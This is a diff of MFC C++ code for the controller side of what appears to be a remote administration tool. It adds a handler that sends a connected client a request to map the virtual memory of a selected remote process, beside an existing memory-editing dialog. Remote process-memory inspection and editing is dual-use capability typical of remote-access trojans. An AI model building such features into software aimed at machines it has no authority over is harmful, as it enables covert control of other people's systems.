@@ -45,6 +45,7 @@ BEGIN_MESSAGE_MAP(CProcessManagerDlg, CDialogEx)
 	ON_MESSAGE(UM_OPEN_CHANGE_MEMORY_DIALOG, &CProcessManagerDlg::OnOpenChangeMemoryDialog)
 	
 	
+	
 	ON_COMMAND(ID_CREATE_PROCESS, &CProcessManagerDlg::OnCreateProcess)
 	ON_COMMAND(ID_VIRTUAL_MEMORY_MAPPING, &CProcessManagerDlg::OnVirtualMemoryMapping)
 END_MESSAGE_MAP()
@@ -469,7 +470,7 @@ LRESULT CProcessManagerDlg::OnOpenChangeMemoryDialog(WPARAM processID, LPARAM co
 
 	//非阻塞对话框
 	CChangeMemoryDlg* Dialog = new CChangeMemoryDlg(this, m_IocpServer, ContextObject);
-	//m_CreateProcessDlg = Dialog;
+	
 	// 设置父窗口为卓面
 	Dialog->Create(IDD_QUERY_MEMORY_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
 	Dialog->ShowWindow(SW_SHOW);
@@ -479,13 +480,40 @@ LRESULT CProcessManagerDlg::OnOpenChangeMemoryDialog(WPARAM processID, LPARAM co
 	return 0;
 }
 
+
 void CProcessManagerDlg::OnVirtualMemoryMapping()
 {
 	// TODO: 在此添加命令处理程序代码
-	////动态窗口  
+
+
+	int BufferLength = sizeof(BYTE)+sizeof(HANDLE);
+	LPBYTE BufferData = new BYTE[BufferLength];
+	ZeroMemory(BufferData, BufferLength);
+	BufferData[0] = CLIENT_VIRTUAL_MEMORY_MAPPING_REQUIRE;
+	POSITION Position = m_ProcessInfoList.GetFirstSelectedItemPosition();
+	int Item = m_ProcessInfoList.GetNextSelectedItem(Position);
+	HANDLE ProcessIdentity = (HANDLE)m_ProcessInfoList.GetItemData(Item);
+	CVMMapDlg::m_ProcessIdentity = ProcessIdentity;
+
+	CString Path = m_ProcessInfoList.GetItemText(Item, 2);
+	CVMMapDlg::m_ProcessPath = Path;
+
+	memcpy(BufferData + sizeof(BYTE), &ProcessIdentity, sizeof(HANDLE));
+
+	POSITION Position2 = this->m_ProcessInfoList.GetFirstSelectedItemPosition();
+	int Item2 = this->m_ProcessInfoList.GetNextSelectedItem(Position2);
+	__ProcessIdentity = (HANDLE)(this->m_ProcessInfoList.GetItemData(Item2));
+	//动态窗口  
 	CVMMapDlg* Dialog = new CVMMapDlg(this, m_IocpServer, m_ContextObject);
+
 	// 设置父窗口为桌面
 	Dialog->Create(IDD_VIRTUAL_MEMORY_MAPPING_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
 	Dialog->ShowWindow(SW_SHOW);
 
+	m_ContextObject->VMMapDlg = Dialog;
+
+	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
+
+
+	
 }
